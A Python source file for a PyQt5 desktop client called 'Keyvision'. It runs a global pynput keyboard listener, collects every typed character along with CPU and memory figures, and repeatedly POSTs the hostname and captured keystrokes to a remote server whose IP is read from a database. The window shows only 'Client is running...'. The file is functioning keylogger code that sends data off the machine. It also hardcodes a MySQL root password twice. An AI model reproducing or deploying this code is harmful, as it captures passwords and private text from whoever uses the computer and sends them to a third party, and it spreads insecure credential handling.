import socket
import time
import requests
import psutil
import MySQLdb
from threading import Thread
from flask import request
from pynput import keyboard
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import Qt
from PyQt5.uic import loadUiType
from os import path

Form, _ = loadUiType(path.join(path.dirname(__file__), "main.ui"))

typed_chars = []
class ClientUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.start_client()

    def initUI(self):
        self.setWindowTitle("Keyvision")
        self.setWindowIcon(QIcon("logo.ico"))
        self.setGeometry(100, 100, 400, 200)
        layout = QVBoxLayout()
        self.label = QLabel("Client is running...")
        self.label.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.label)
        self.setLayout(layout)

    def start_client(self):
        hostname = socket.gethostname()
        self.db = MySQLdb.connect(
            host="localhost",
            user="root",
            password="M.M.M@mo206",
            database="logs_db"
        )
        self.cursor = self.db.cursor()
        self.cursor.execute("SELECT * FROM server_ip")
        data = self.cursor.fetchall()
        for row in data:
            server_ip = row[1]

        self.cursor.close()
        print(server_ip)
        SERVER_URL = f"http://{server_ip}:5000/logs"  

        global typed_chars

        def get_system_logs():
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory().percent
            return cpu_usage, memory_usage

        def on_press(key):
            try:
                typed_chars.append(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    typed_chars.append(" ")
                # elif key == keyboard.Key.enter:
                #     typed_chars.append("\n")
                # else:
                #     typed_chars.append(f"[{key.name}]") 

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()

        def client_loop():
            self.db = MySQLdb.connect(
                host="localhost",
                user="root",
                password="M.M.M@mo206",
                database="logs_db"
            )
            self.cursor = self.db.cursor()
            self.cursor.execute("SELECT * FROM sleeptime")
            data = self.cursor.fetchall()
            for row in data:
                sleeptime = row[1]

            self.cursor.close()
            while True:
                cpu, memory = get_system_logs()
                typed_text = "".join(typed_chars)

                log_data = {
                    "pc_id": hostname, 
                    "cpu_usage": cpu,
                    "memory_usage": memory,
                    "key_pressed": typed_text
                }

                try:
                    response = requests.post(SERVER_URL, json=log_data)
                    print(f"Sent logs to server: {response.status_code}")
                except Exception as e:
                    print(f"Error sending logs: {e}")

                typed_chars.clear()

                time.sleep(sleeptime)

        client_thread = Thread(target=client_loop)
        client_thread.daemon = True
        client_thread.start()
